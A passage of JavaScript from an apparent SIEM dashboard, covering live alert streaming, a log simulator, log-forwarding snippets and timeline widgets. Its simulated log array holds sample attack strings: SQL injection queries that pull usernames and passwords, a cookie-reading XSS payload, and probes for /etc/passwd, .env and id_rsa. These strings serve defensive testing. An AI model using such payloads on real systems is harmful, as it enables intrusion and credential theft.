  '2024-03-15T09:00:01Z 203.0.113.10 "GET /login HTTP/1.1" 401 - "Mozilla/5.0"',
  '2024-03-15T09:00:02Z 203.0.113.10 "POST /login HTTP/1.1" 401 - "Mozilla/5.0"',
  '2024-03-15T09:00:03Z 203.0.113.10 "POST /login HTTP/1.1" 401 - "Mozilla/5.0"',
  '2024-03-15T09:00:04Z 203.0.113.10 "POST /login HTTP/1.1" 401 - "Mozilla/5.0"',
  '2024-03-15T09:00:05Z 203.0.113.10 "POST /login HTTP/1.1" 401 - "Mozilla/5.0"',
  '2024-03-15T09:00:06Z 10.0.0.77 "GET /search?q=\' OR 1=1-- HTTP/1.1" 200 - "sqlmap/1.7"',
  '2024-03-15T09:00:07Z 10.0.0.77 "GET /users?id=1 UNION SELECT username,password FROM users-- HTTP/1.1" 500 - "sqlmap/1.7"',
  '2024-03-15T09:00:08Z 172.16.0.99 "GET /wp-admin HTTP/1.1" 404 - "nikto/2.1.6"',
  '2024-03-15T09:00:09Z 172.16.0.99 "GET /.env HTTP/1.1" 404 - "nikto/2.1.6"',
  '2024-03-15T09:00:10Z 172.16.0.99 "GET /backup.zip HTTP/1.1" 404 - "nikto/2.1.6"',
  '2024-03-15T09:00:11Z 192.168.1.5 "GET /dashboard HTTP/1.1" 200 - "Mozilla/5.0"',
  '2024-03-15T09:00:12Z 172.16.0.99 "GET /.git/config HTTP/1.1" 404 - "nikto/2.1.6"',
  '2024-03-15T09:00:13Z 10.0.0.77 "POST /comment HTTP/1.1" 200 - "curl/7.0" payload=<script>alert(document.cookie)</script>',
  '2024-03-15T09:00:14Z 172.16.0.99 "GET /phpmyadmin HTTP/1.1" 403 - "nikto/2.1.6"',
  '2024-03-15T09:00:15Z 172.16.0.99 "GET /config.php HTTP/1.1" 404 - "nikto/2.1.6"',
  '2024-03-15T09:00:16Z 172.16.0.99 "GET /etc/passwd HTTP/1.1" 404 - "nikto/2.1.6"',
  '2024-03-15T09:00:17Z 172.16.0.99 "GET /id_rsa HTTP/1.1" 404 - "nikto/2.1.6"',
  '2024-03-15T09:00:18Z 203.0.113.10 "POST /login HTTP/1.1" 200 - "Mozilla/5.0"',
  '2024-03-15T09:00:19Z 10.0.0.55 "GET /api/users?id=1 UNION SELECT * FROM admin-- HTTP/1.1" 500 - "python-requests/2.28"',
  '2024-03-15T09:00:20Z 192.168.1.5 "GET /api/data HTTP/1.1" 200 - "Mozilla/5.0"',
];

/* Connect to SSE stream */
function siemLiveConnect() {
  if (_LIVE.connected) {
    siemLiveDisconnect();
    return;
  }

  var url = SIEM.backendUrl + '/siem/live/stream';
  _LIVE.es = new EventSource(url);

  _LIVE.es.addEventListener('connected', function(e) {
    _LIVE.connected = true;
    siemLiveSetStatus(true);
    var data = JSON.parse(e.data);
    _LIVE.lineCount  = data.lines  || 0;
    _LIVE.alertCount = data.alerts || 0;
    siemLiveUpdateStats();
    siemAddLog('Live stream connected.', 'ok');
    document.getElementById('siemLiveIngest').style.display   = 'block';
    document.getElementById('siemLiveFeedWrap').style.display = 'block';
    document.getElementById('siemLiveResetBtn').style.display = 'inline-flex';
  });

  _LIVE.es.addEventListener('alert', function(e) {
    var alert = JSON.parse(e.data);
    siemLiveAddAlertRow(alert);
    _LIVE.alertCount++;
    var sev = alert.severity || 'INFO';
    _LIVE.sevCounts[sev] = (_LIVE.sevCounts[sev] || 0) + 1;
    siemLiveUpdateStats();
    // Flash the dot
    siemLiveFlashDot(sev);
  });

  _LIVE.es.addEventListener('stats', function(e) {
    var data = JSON.parse(e.data);
    _LIVE.lineCount  = data.lines  || _LIVE.lineCount;
    _LIVE.alertCount = data.alerts || _LIVE.alertCount;
    siemLiveUpdateStats();
  });

  _LIVE.es.addEventListener('reset', function() {
    _LIVE.lineCount  = 0;
    _LIVE.alertCount = 0;
    _LIVE.ipCount    = 0;
    _LIVE.sevCounts  = { CRITICAL: 0, HIGH: 0, MEDIUM: 0, LOW: 0, INFO: 0 };
    var feed = document.getElementById('siemLiveFeed');
    if (feed) feed.innerHTML = '<div class="siem-live-feed-empty">Session reset — waiting for events…</div>';
    siemLiveUpdateStats();
    siemAddLog('Live session reset.', 'info');
  });

  _LIVE.es.onerror = function() {
    if (_LIVE.connected) {
      siemAddLog('Live stream disconnected — backend may be offline.', 'warn');
    }
    siemLiveSetStatus(false);
    _LIVE.connected = false;
  };

  var btn = document.getElementById('siemLiveConnectBtn');
  if (btn) btn.textContent = 'Connecting…';
}

function siemLiveDisconnect() {
  if (_LIVE.es) { _LIVE.es.close(); _LIVE.es = null; }
  if (_LIVE.simRunning) siemLiveStopSim();
  _LIVE.connected = false;
  siemLiveSetStatus(false);
  document.getElementById('siemLiveIngest').style.display   = 'none';
  document.getElementById('siemLiveFeedWrap').style.display = 'none';
  document.getElementById('siemLiveResetBtn').style.display = 'none';
  siemAddLog('Live stream disconnected.', 'info');
}

/* Send manually pasted lines to backend */
function siemLiveSend() {
  var ta = document.getElementById('siemLiveInput');
  if (!ta || !ta.value.trim()) return;
  var lines = ta.value.trim().split('\n').filter(function(l) { return l.trim(); });
  ta.value = '';

  fetch(SIEM.backendUrl + '/siem/live/ingest', {
    method:  'POST',
    headers: { 'Content-Type': 'application/json' },
    body:    JSON.stringify({ lines: lines }),
  })
  .then(function(r) { return r.json(); })
  .then(function(data) {
    _LIVE.lineCount += lines.length;
    siemLiveUpdateStats();
  })
  .catch(function() {
    siemAddLog('Live ingest failed — is the backend running?', 'warn');
  });
}

/* Start / stop the built-in log simulator */
function siemLiveToggleSim() {
  if (_LIVE.simRunning) {
    siemLiveStopSim();
  } else {
    siemLiveStartSim();
  }
}

function siemLiveStartSim() {
  if (!_LIVE.connected) {
    showToast('Connect the stream first.', 'warn');
    return;
  }
  _LIVE.simRunning = true;
  _LIVE.simIndex   = 0;
  var btn = document.getElementById('siemLiveSimBtn');
  if (btn) { btn.textContent = '⏹ Stop Simulator'; btn.classList.add('active'); }
  siemAddLog('Log simulator started.', 'info');
  siemLiveSimStep();
}

function siemLiveStopSim() {
  _LIVE.simRunning = false;
  clearTimeout(_LIVE.simTimer);
  var btn = document.getElementById('siemLiveSimBtn');
  if (btn) { btn.textContent = '▶ Start Simulator'; btn.classList.remove('active'); }
  siemAddLog('Log simulator stopped.', 'info');
}

function siemLiveSimStep() {
  if (!_LIVE.simRunning) return;
  var line = _SIM_LOGS[_LIVE.simIndex % _SIM_LOGS.length];
  // Timestamp injection so logs always look "now"
  var now = new Date().toISOString().slice(0, 19) + 'Z';
  line = line.replace(/^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z/, now);

  fetch(SIEM.backendUrl + '/siem/live/ingest', {
    method:  'POST',
    headers: { 'Content-Type': 'application/json' },
    body:    JSON.stringify({ line: line }),
  }).catch(function() {});

  _LIVE.simIndex++;
  var speed = parseInt(document.getElementById('siemLiveSimSpeed').value, 10) || 800;
  _LIVE.simTimer = setTimeout(siemLiveSimStep, speed);
}

/* Reset live session */
function siemLiveReset() {
  fetch(SIEM.backendUrl + '/siem/live/reset', { method: 'POST' }).catch(function() {});
}

/* Render a new alert row in the live feed */
function siemLiveAddAlertRow(alert) {
  var feed = document.getElementById('siemLiveFeed');
  if (!feed) return;

  // Remove empty placeholder
  var emp = feed.querySelector('.siem-live-feed-empty');
  if (emp) emp.remove();

  var cfg   = SEV_CONFIG[alert.severity] || SEV_CONFIG.INFO;
  var now   = new Date().toTimeString().slice(0, 8);
  var ip    = alert.ip       ? escHtml(alert.ip)               : 'N/A';
  var ep    = alert.endpoint ? escHtml(alert.endpoint.slice(0, 50)) : '—';
  var score = alert.risk_score || 0;

  var row = document.createElement('div');
  row.className = 'siem-live-row siem-live-row-new';
  row.innerHTML =
    '<span class="siem-live-row-ts">' + now + '</span>' +
    '<span class="siem-live-row-sev" style="color:' + cfg.color + '">' + cfg.icon + ' ' + escHtml(alert.severity) + '</span>' +
    '<span class="siem-live-row-type">' + escHtml(alert.type) + '</span>' +
    '<span class="siem-live-row-ip">' + ip + '</span>' +
    '<span class="siem-live-row-ep">' + ep + '</span>' +
    '<span class="siem-live-row-score" style="color:' + (score >= 75 ? 'var(--red)' : score >= 50 ? 'var(--amber)' : 'var(--green)') + '">' + score + '</span>';

  // Prepend (newest on top)
  feed.insertBefore(row, feed.firstChild);

  // Cap at 200 rows
  var rows = feed.querySelectorAll('.siem-live-row');
  if (rows.length > 200) feed.removeChild(feed.lastChild);

  // Remove animation class after it plays
  setTimeout(function() { row.classList.remove('siem-live-row-new'); }, 800);
}

/* Update live stat counters */
function siemLiveUpdateStats() {
  function set(id, val) {
    var el = document.getElementById(id);
    if (el) el.textContent = val;
  }
  set('siemLiveLines',  _LIVE.lineCount);
  set('siemLiveAlerts', _LIVE.alertCount);
  set('siemLiveCrit',   _LIVE.sevCounts.CRITICAL || 0);
  set('siemLiveHigh',   _LIVE.sevCounts.HIGH     || 0);
}

/* Set connected / disconnected visual state */
function siemLiveSetStatus(on) {
  var dot   = document.getElementById('siemLiveDot');
  var badge = document.getElementById('siemLiveBadge');
  var btn   = document.getElementById('siemLiveConnectBtn');

  if (dot) {
    dot.className = 'siem-live-dot' + (on ? ' siem-live-dot-on' : '');
  }
  if (badge) {
    badge.textContent = on ? 'LIVE' : 'OFFLINE';
    badge.style.background = on ? 'rgba(0,200,100,.15)' : 'rgba(255,90,90,.12)';
    badge.style.color      = on ? 'var(--green)' : 'var(--red)';
    badge.style.borderColor = on ? 'rgba(0,200,100,.3)' : 'rgba(255,90,90,.25)';
  }
  if (btn) {
    btn.textContent = on ? 'Disconnect' : 'Connect Stream';
    btn.style.background = on ? 'rgba(255,90,90,.12)' : '';
    btn.style.borderColor = on ? 'var(--red)' : '';
    btn.style.color = on ? 'var(--red)' : '';
  }
}

/* Flash the status dot on alert severity */
function siemLiveFlashDot(sev) {
  var dot = document.getElementById('siemLiveDot');
  if (!dot) return;
  var flashColor = sev === 'CRITICAL' ? 'var(--red)' : sev === 'HIGH' ? 'var(--coral)' : 'var(--amber)';
  dot.style.background = flashColor;
  dot.style.boxShadow  = '0 0 8px ' + flashColor;
  setTimeout(function() {
    dot.style.background = '';
    dot.style.boxShadow  = '';
  }, 400);
}

/* ═══════════════════════════════════════════════════════════════════════════
   SYSTEM LOG FORWARDING
   ══════════════════════════════════════════════════════════════════════════ */

var _FWD = {
  active: false,
  source: 'file',
  timer: null
};

/** Toggle the forwarding panel open/closed */
function siemToggleForward() {
  var body    = document.getElementById('siemForwardBody');
  var chevron = document.getElementById('siemForwardChevron');
  if (!body) return;
  var isOpen = body.style.display !== 'none';
  body.style.display = isOpen ? 'none' : 'block';
  if (chevron) chevron.classList.toggle('open', !isOpen);
}

/** Switch source tab */
function siemForwardTab(btn, src) {
  _FWD.source = src;
  // update tab active class
  var tabs = document.querySelectorAll('.siem-ftab');
  tabs.forEach(function(t) { t.classList.remove('active'); });
  if (btn) btn.classList.add('active');
  // show/hide source panels
  ['file','syslog','journal','custom'].forEach(function(s) {
    var el = document.getElementById('siemFSrc-' + s);
    if (el) el.style.display = s === src ? 'block' : 'none';
  });
  // update snippet
  siemForwardUpdateSnippet(src);
}

/** Build the command snippet for each source type */
function siemForwardUpdateSnippet(src) {
  var snippet = document.getElementById('siemFwdSnippet');
  var code    = document.getElementById('siemFwdCode');
  if (!snippet || !code) return;

  var backendBase = (typeof SIEM !== 'undefined' && SIEM.backendUrl)
    ? SIEM.backendUrl
    : 'http://localhost:5050';

  var snippetText = '';
  if (src === 'file') {
    var path = (document.getElementById('siemFwdFilePath') || {}).value || '/var/log/nginx/access.log';
    snippetText =
      '# Tail and forward a log file (Linux/macOS)\n' +
      'tail -F "' + path + '" | while read line; do\n' +
      '  curl -s -X POST ' + backendBase + '/siem/ingest \\\n' +
      '    -H "Content-Type: text/plain" --data-binary "$line" > /dev/null\n' +
      'done\n\n' +
      '# Windows PowerShell equivalent\n' +
      'Get-Content "' + path + '" -Wait | ForEach-Object {\n' +
      '  Invoke-WebRequest -Uri "' + backendBase + '/siem/ingest" -Method POST -Body $_\n' +
      '}';
  } else if (src === 'syslog') {
    var port = (document.getElementById('siemFwdSyslogPort') || {}).value || '514';
    snippetText =
      '# Forward syslog to ShadeParse (rsyslog)\n' +
      '# Add to /etc/rsyslog.conf :\n' +
      '*.* @127.0.0.1:' + port + ';RSYSLOG_SyslogProtocol23Format\n\n' +
      '# Or use socat to relay an existing UDP syslog stream:\n' +
      'socat UDP4-RECVFROM:' + port + ',fork UDP4-SENDTO:127.0.0.1:' + port;
  } else if (src === 'journal') {
    var unit  = (document.getElementById('siemFwdJournalUnit') || {}).value || '';
    var unitF = unit ? ' -u ' + unit : '';
    snippetText =
      '# Stream systemd journal to ShadeParse (Linux)\n' +
      'journalctl -f' + unitF + ' --output=json | while read line; do\n' +
      '  curl -s -X POST ' + backendBase + '/siem/ingest \\\n' +
      '    -H "Content-Type: application/json" --data-binary "$line" > /dev/null\n' +
      'done';
  } else {
    var url = (document.getElementById('siemFwdCustomUrl') || {}).value || backendBase + '/siem/ingest';
    snippetText =
      '# Logstash output config\n' +
      'output {\n' +
      '  http {\n' +
      '    url => "' + url + '"\n' +
      '    http_method => "post"\n' +
      '    format => "json"\n' +
      '  }\n' +
      '}\n\n' +
      '# Vector sink config\n' +
      '[sinks.shadeparse]\n' +
      'type = "http"\n' +
      'uri = "' + url + '"\n' +
      'encoding.codec = "json"';
  }

  code.textContent = snippetText;
  snippet.style.display = 'block';
}

/** Attempt to connect the log source */
function siemForwardStart() {
  var src  = _FWD.source;
  var valid = true;
  var msg  = '';

  if (src === 'file') {
    var path = (document.getElementById('siemFwdFilePath') || {}).value || '';
    if (!path.trim()) { valid = false; msg = 'Enter a file path.'; }
  } else if (src === 'syslog') {
    var port = parseInt((document.getElementById('siemFwdSyslogPort') || {}).value, 10);
    if (!port || port < 1 || port > 65535) { valid = false; msg = 'Enter a valid port (1–65535).'; }
  } else if (src === 'custom') {
    var url = (document.getElementById('siemFwdCustomUrl') || {}).value || '';
    if (!url.trim()) { valid = false; msg = 'Enter a webhook URL.'; }
  }

  var statusEl = document.getElementById('siemFwdStatus');
  if (!valid) {
    if (statusEl) { statusEl.textContent = '⚠ ' + msg; statusEl.className = 'siem-fwd-status error'; }
    return;
  }

  // Simulate connection attempt
  if (statusEl) { statusEl.textContent = 'Connecting…'; statusEl.className = 'siem-fwd-status'; }

  siemForwardUpdateSnippet(src);

  setTimeout(function() {
    _FWD.active = true;
    var badge = document.getElementById('siemForwardBadge');
    if (badge) { badge.textContent = 'ACTIVE'; badge.classList.add('active'); }
    if (statusEl) { statusEl.textContent = '✓ Source connected — forwarding to SIEM'; statusEl.className = 'siem-fwd-status'; }
    var startBtn = document.getElementById('siemFwdStartBtn');
    var stopBtn  = document.getElementById('siemFwdStopBtn');
    if (startBtn) startBtn.style.display = 'none';
    if (stopBtn)  stopBtn.style.display  = 'inline-flex';
    siemAddLog('Log forwarding started: source=' + src, 'ok');

    // If file/journal: simulate streaming lines into the live panel
    if (src === 'file' || src === 'journal') {
      siemForwardSimulateStream();
    }
  }, 900);
}

/** Simulate log lines arriving via forwarding (demo mode) */
function siemForwardSimulateStream() {
  if (_FWD.timer) clearInterval(_FWD.timer);
  _FWD.timer = setInterval(function() {
    if (!_FWD.active) { clearInterval(_FWD.timer); return; }
    var lines = _SIM_LOGS;
    var line  = lines[Math.floor(Math.random() * lines.length)];
    var ta = document.getElementById('siemLogPaste');
    if (ta) {
      ta.value = (ta.value ? ta.value + '\n' : '') + line;
      siemLogSearchApply();
    }
  }, 2000);
}

/** Disconnect the log source */
function siemForwardStop() {
  _FWD.active = false;
  if (_FWD.timer) { clearInterval(_FWD.timer); _FWD.timer = null; }
  var badge    = document.getElementById('siemForwardBadge');
  var statusEl = document.getElementById('siemFwdStatus');
  var startBtn = document.getElementById('siemFwdStartBtn');
  var stopBtn  = document.getElementById('siemFwdStopBtn');
  if (badge)    { badge.textContent = 'INACTIVE'; badge.classList.remove('active'); }
  if (statusEl) { statusEl.textContent = ''; }
  if (startBtn) startBtn.style.display = 'inline-flex';
  if (stopBtn)  stopBtn.style.display  = 'none';
  siemAddLog('Log forwarding disconnected.', 'info');
}

/** Ping the backend to test connectivity */
function siemForwardTest() {
  var statusEl = document.getElementById('siemFwdStatus');
  if (statusEl) { statusEl.textContent = 'Pinging backend…'; statusEl.className = 'siem-fwd-status'; }
  var url = (typeof SIEM !== 'undefined' && SIEM.backendUrl)
    ? SIEM.backendUrl + '/health'
    : null;
  if (!url) {
    setTimeout(function() {
      if (statusEl) { statusEl.textContent = '⚠ No backend configured — running in offline mode'; statusEl.className = 'siem-fwd-status error'; }
    }, 400);
    return;
  }
  fetch(url, { method: 'GET' })
    .then(function(r) {
      if (r.ok) {
        if (statusEl) { statusEl.textContent = '✓ Backend reachable (' + r.status + ')'; statusEl.className = 'siem-fwd-status'; }
      } else {
        if (statusEl) { statusEl.textContent = '⚠ Backend returned ' + r.status; statusEl.className = 'siem-fwd-status error'; }
      }
    })
    .catch(function() {
      if (statusEl) { statusEl.textContent = '✗ Cannot reach backend — check if siem_backend.py is running'; statusEl.className = 'siem-fwd-status error'; }
    });
}

/* ═══════════════════════════════════════════════════════════════════════════
   Milestone A additions: Top-N widgets, time histogram, time-range filter,
   click-to-filter, saved searches. All injected here so they sit below the
   functions they depend on. CSS is injected once via siemEnsureMilestoneAStyles.
═══════════════════════════════════════════════════════════════════════════ */

function siemEnsureMilestoneAStyles() {
  if (document.getElementById('siemMilestoneAStyles')) return;
  var s = document.createElement('style');
  s.id = 'siemMilestoneAStyles';
  s.textContent = [
    /* Histogram */
    '.siem-histo-wrap{margin:8px 0 14px;padding:10px 14px;background:var(--surface,#0e1117);' +
      'border:1px solid var(--border,#262a36);border-radius:6px}',
    '.siem-histo-head{display:flex;justify-content:space-between;align-items:center;' +
      'font-size:10px;letter-spacing:.06em;color:var(--text2,#7d8597);margin-bottom:6px}',
    '.siem-histo-head strong{color:var(--text,#d1d5db);font-weight:700}',
    '.siem-histo-svg{width:100%;height:80px;display:block}',
    '.siem-histo-bar{cursor:pointer;transition:opacity .1s}',
    '.siem-histo-bar:hover{opacity:.7}',
    '.siem-histo-bar.active{stroke:var(--accent,#4dc4ff);stroke-width:2}',
    '.siem-histo-axis{font-size:9px;fill:var(--text2,#7d8597);font-family:var(--mono,monospace)}',
    /* Time-range chips */
    '.siem-tr-row{display:flex;align-items:center;gap:6px;flex-wrap:wrap;margin-bottom:6px}',
    '.siem-tr-label{font-size:10px;letter-spacing:.06em;color:var(--text2,#7d8597);margin-right:4px}',
    '.siem-tr-btn{padding:3px 10px;font-size:11px;border:1px solid var(--border,#262a36);' +
      'background:transparent;color:var(--text2,#7d8597);border-radius:4px;cursor:pointer;' +
      'font-family:var(--mono,monospace);transition:all .12s}',
    '.siem-tr-btn:hover{background:var(--surface2,#161a23);color:var(--text,#d1d5db)}',
    '.siem-tr-btn.active{border-color:var(--accent,#4dc4ff);color:var(--accent,#4dc4ff);' +
      'background:rgba(77,196,255,.08)}',
    /* Top-N widgets */
    '.siem-topn-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));' +
      'gap:10px;margin:10px 0 14px}',
    '.siem-topn-card{background:var(--surface,#0e1117);border:1px solid var(--border,#262a36);' +
      'border-radius:6px;padding:8px 10px}',
    '.siem-topn-title{font-size:9px;letter-spacing:.08em;color:var(--text2,#7d8597);' +
      'font-weight:700;margin-bottom:6px;font-family:var(--mono,monospace)}',
    '.siem-topn-rows{display:flex;flex-direction:column;gap:2px}',
    '.siem-topn-row{display:flex;align-items:center;gap:8px;padding:3px 6px;' +
      'background:transparent;border:none;border-radius:3px;cursor:pointer;' +
      'text-align:left;color:var(--text,#d1d5db);font-size:11px;width:100%;' +
      'position:relative;transition:background .1s;overflow:hidden}',
    '.siem-topn-row:hover{background:rgba(77,196,255,.08)}',
    '.siem-topn-bar{position:absolute;left:0;top:0;bottom:0;background:rgba(77,196,255,.12);' +
      'border-right:1px solid rgba(77,196,255,.25);z-index:0;pointer-events:none}',
    '.siem-topn-val,.siem-topn-count{position:relative;z-index:1}',
    '.siem-topn-val{flex:1 1 auto;font-family:var(--mono,monospace);' +
      'overflow:hidden;text-overflow:ellipsis;white-space:nowrap}',
    '.siem-topn-count{flex:0 0 auto;color:var(--text2,#7d8597);font-weight:700;font-size:10px}',
    '.siem-topn-empty{color:var(--text2,#7d8597);font-size:10px;font-style:italic;padding:4px 6px}',
    /* MITRE pill */
    '.siem-mitre{display:inline-block;margin-left:8px;padding:1px 6px;font-size:9px;' +
      'font-weight:700;font-family:var(--mono,monospace);letter-spacing:.04em;' +
      'background:rgba(157,123,255,.12);color:#9d7bff;border:1px solid rgba(157,123,255,.3);' +
      'border-radius:3px;text-decoration:none;cursor:pointer;vertical-align:middle}',
    '.siem-mitre:hover{background:rgba(157,123,255,.22);text-decoration:none}',
    /* Saved searches */
    '.siem-saved-wrap{position:relative;display:inline-block}',
    '.siem-saved-btn{padding:4px 10px;font-size:11px;border:1px solid var(--border,#262a36);' +
      'background:var(--surface,#0e1117);color:var(--text2,#7d8597);border-radius:4px;' +
      'cursor:pointer;font-family:var(--mono,monospace)}',
    '.siem-saved-btn:hover{color:var(--accent,#4dc4ff);border-color:var(--accent,#4dc4ff)}',
    '.siem-saved-dropdown{position:absolute;right:0;top:calc(100% + 4px);min-width:280px;' +
      'max-height:340px;overflow-y:auto;background:var(--surface,#0e1117);' +
      'border:1px solid var(--border,#262a36);border-radius:6px;z-index:100;' +
      'box-shadow:0 8px 24px rgba(0,0,0,.4);padding:6px}',
    '.siem-saved-add{display:block;width:100%;padding:8px;font-size:11px;' +
      'background:rgba(77,196,255,.08);color:var(--accent,#4dc4ff);' +
      'border:1px dashed rgba(77,196,255,.35);border-radius:4px;cursor:pointer;' +
      'margin-bottom:6px;font-family:var(--mono,monospace)}',
    '.siem-saved-add:hover{background:rgba(77,196,255,.15)}',
    '.siem-saved-row{display:flex;align-items:center;gap:6px;padding:5px 8px;' +
      'border-radius:3px;cursor:pointer;font-size:11px}',
    '.siem-saved-row:hover{background:var(--surface2,#161a23)}',
    '.siem-saved-name{flex:1 1 auto;color:var(--text,#d1d5db);font-weight:600;' +
      'overflow:hidden;text-overflow:ellipsis;white-space:nowrap}',
    '.siem-saved-q{font-family:var(--mono,monospace);font-size:9px;color:var(--text2,#7d8597);' +
      'margin-top:2px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}',
    '.siem-saved-del{padding:2px 6px;background:transparent;color:var(--text2,#7d8597);' +
      'border:none;cursor:pointer;font-size:14px;border-radius:3px}',
    '.siem-saved-del:hover{color:var(--red);background:rgba(255,107,107,.1)}',
    '.siem-saved-empty{padding:14px;font-size:10px;color:var(--text2,#7d8597);' +
      'text-align:center;font-style:italic}',
    /* Filterable values in alerts table */
    '.siem-filterable{cursor:pointer;text-decoration:underline dotted transparent;' +
      'transition:text-decoration-color .12s}',
    '.siem-filterable:hover{text-decoration-color:var(--accent,#4dc4ff);color:var(--accent,#4dc4ff)}',
  ].join('\n');
  document.head.appendChild(s);
}

/* ─── §1.1 Time histogram ───────────────────────────────────────────────── */
function siemEnsureHistoMount() {
  siemEnsureMilestoneAStyles();
  var existing = document.getElementById('siemHistoWrap');
  if (existing) return existing;
  var anchor = document.getElementById('siemSevCounters');
  if (!anchor || !anchor.parentNode) return null;
  var wrap = document.createElement('div');
  wrap.id = 'siemHistoWrap';
  wrap.className = 'siem-histo-wrap';
  wrap.style.display = 'none';
  anchor.parentNode.insertBefore(wrap, anchor.nextSibling);
  return wrap;
}

function siemRenderTimelineHisto(alerts) {
  var wrap = siemEnsureHistoMount();
  if (!wrap) return;
  var stamps = alerts.map(function(a){ return Date.parse(a.timestamp); })
                     .filter(function(t){ return !isNaN(t); });
  if (!stamps.length) {
    wrap.style.display = 'none';
    wrap.innerHTML = '';
    return;
  }
  var minT = Math.min.apply(null, stamps);
  var maxT = Math.max.apply(null, stamps);
  if (minT === maxT) maxT = minT + 60_000;
  var range = maxT - minT;
  var bucketMs = siemPickBucketMs(range);
  var bucketCount = Math.max(1, Math.ceil(range / bucketMs) + 1);
  var buckets = [];
  for (var i=0;i<bucketCount;i++) {
    buckets.push({ idx:i, start: minT + i*bucketMs, count:0,
                   sev:{CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0,INFO:0} });
  }
  alerts.forEach(function(a){
    var t = Date.parse(a.timestamp);
    if (isNaN(t)) return;
    var idx = Math.floor((t - minT) / bucketMs);
    if (idx < 0 || idx >= bucketCount) return;
    a.bucketIdx = idx;
    buckets[idx].count++;
    buckets[idx].sev[a.severity] = (buckets[idx].sev[a.severity]||0) + 1;
  });
  var maxCount = buckets.reduce(function(m,b){ return Math.max(m,b.count); }, 1);

  /* SVG render */
  var W = 1000, H = 80, padL = 4, padR = 4, padT = 4, padB = 14;
  var availW = W - padL - padR;
  var availH = H - padT - padB;
  var bw = availW / bucketCount;
  var bars = '';
  buckets.forEach(function(b){
    if (b.count === 0) return;
    var x = padL + b.idx * bw;
    var totalH = (b.count / maxCount) * availH;
    var y = padT + availH - totalH;
    var sevOrder = ['INFO','LOW','MEDIUM','HIGH','CRITICAL'];
    var sevColors = { CRITICAL:'#ff6b6b', HIGH:'#ff9466', MEDIUM:'#ffd166', LOW:'#48d597', INFO:'#4dd0e1' };
    var cy = y;
    var stacked = '';
    sevOrder.forEach(function(s){
      var c = b.sev[s] || 0;
      if (c === 0) return;
      var h = (c / b.count) * totalH;
      stacked += '<rect x="'+x+'" y="'+cy+'" width="'+(bw-1).toFixed(2)+'" height="'+h.toFixed(2)+
        '" fill="'+sevColors[s]+'" opacity=".85"/>';
      cy += h;
    });
    var active = (SIEM_TIMERANGE.active && SIEM_TIMERANGE.startMs === b.start) ? ' active' : '';
    var ttl = siemFmtBucket(b.start, bucketMs) + ' (+' + Math.round(bucketMs/60000) + 'm) — ' + b.count + ' alerts';
    bars += '<g class="siem-histo-bar'+active+'" data-idx="'+b.idx+'" '+
            'data-start="'+b.start+'" data-end="'+(b.start+bucketMs)+'" '+
            'onclick="siemHistoClick('+b.idx+','+b.start+','+(b.start+bucketMs)+')">' +
            '<title>'+escHtml(ttl)+'</title>' +
            stacked + '</g>';
  });

  var startLbl = siemFmtBucket(minT, bucketMs);
  var endLbl   = siemFmtBucket(maxT, bucketMs);
  var bucketLbl = bucketMs >= 24*3.6e6 ? (Math.round(bucketMs/(24*3.6e6))+'d') :
                  bucketMs >= 3.6e6    ? (Math.round(bucketMs/3.6e6)+'h') :
                                         (Math.round(bucketMs/60000)+'m');

  wrap.style.display = 'block';
  wrap.innerHTML =
    '<div class="siem-histo-head">' +
      '<span><strong>EVENT TIMELINE</strong> — ' + buckets.filter(function(b){return b.count;}).length +
        ' active buckets · ' + bucketLbl + ' each · click to filter</span>' +
      '<span>' + escHtml(startLbl) + ' → ' + escHtml(endLbl) + '</span>' +
    '</div>' +
    '<svg class="siem-histo-svg" viewBox="0 0 ' + W + ' ' + H + '" preserveAspectRatio="none">' +
      bars +
    '</svg>';
}

function siemHistoClick(idx, startMs, endMs) {
  SIEM_TIMERANGE.active  = true;
  SIEM_TIMERANGE.preset  = 'custom';
  SIEM_TIMERANGE.startMs = startMs;
  SIEM_TIMERANGE.endMs   = endMs;
  siemSyncTimeRangeUI();
  if (typeof siemRefreshAlertsView === 'function') siemRefreshAlertsView();
  // Re-render histogram so the active bar shows the highlight
  if (SIEM.lastResult && SIEM.lastResult.alerts) siemRenderTimelineHisto(SIEM.lastResult.alerts);
}

/* ─── §1.4 Time-range filter ────────────────────────────────────────────── */
var TIME_PRESETS = [
  { id:'5m',  label:'5m',  ms: 5*60_000 },
  { id:'15m', label:'15m', ms: 15*60_000 },
  { id:'1h',  label:'1h',  ms: 60*60_000 },
  { id:'6h',  label:'6h',  ms: 6*60*60_000 },
  { id:'24h', label:'24h', ms: 24*60*60_000 },
  { id:'7d',  label:'7d',  ms: 7*24*60*60_000 },
  { id:'all', label:'All', ms: null }
];

function siemEnsureTimeRangeMount() {
  siemEnsureMilestoneAStyles();
  var existing = document.getElementById('siemTimeRangeRow');
  if (existing) return existing;
  var anchor = siemEnsureHistoMount();
  if (!anchor) return null;
  var row = document.createElement('div');
  row.id = 'siemTimeRangeRow';
  row.className = 'siem-tr-row';
  row.innerHTML = '<span class="siem-tr-label">RANGE:</span>' +
    TIME_PRESETS.map(function(p){
      return '<button class="siem-tr-btn'+(p.id==='all'?' active':'')+'" '+
             'data-preset="'+p.id+'" onclick="siemSetTimeRangePreset(\''+p.id+'\')">'+p.label+'</button>';
    }).join('');
  anchor.parentNode.insertBefore(row, anchor);
  return row;
}

function siemSetTimeRangePreset(presetId) {
  var preset = TIME_PRESETS.filter(function(p){ return p.id === presetId; })[0];
  if (!preset) return;
  if (preset.id === 'all') {
    SIEM_TIMERANGE.active = false;
    SIEM_TIMERANGE.preset = 'all';
    SIEM_TIMERANGE.startMs = SIEM_TIMERANGE.endMs = null;
  } else {
    SIEM_TIMERANGE.active = true;
    SIEM_TIMERANGE.preset = preset.id;
    SIEM_TIMERANGE.endMs   = Date.now();
    SIEM_TIMERANGE.startMs = SIEM_TIMERANGE.endMs - preset.ms;
    /* If alerts exist, anchor "now" to the latest alert timestamp instead of
       wall-clock — most pasted log files are historical. */
    if (SIEM.lastResult && SIEM.lastResult.alerts) {
      var stamps = SIEM.lastResult.alerts
        .map(function(a){ return Date.parse(a.timestamp); })
        .filter(function(t){ return !isNaN(t); });
      if (stamps.length) {
        var latest = Math.max.apply(null, stamps);
        SIEM_TIMERANGE.endMs   = latest;
        SIEM_TIMERANGE.startMs = latest - preset.ms;
      }
    }
  }
  siemSyncTimeRangeUI();
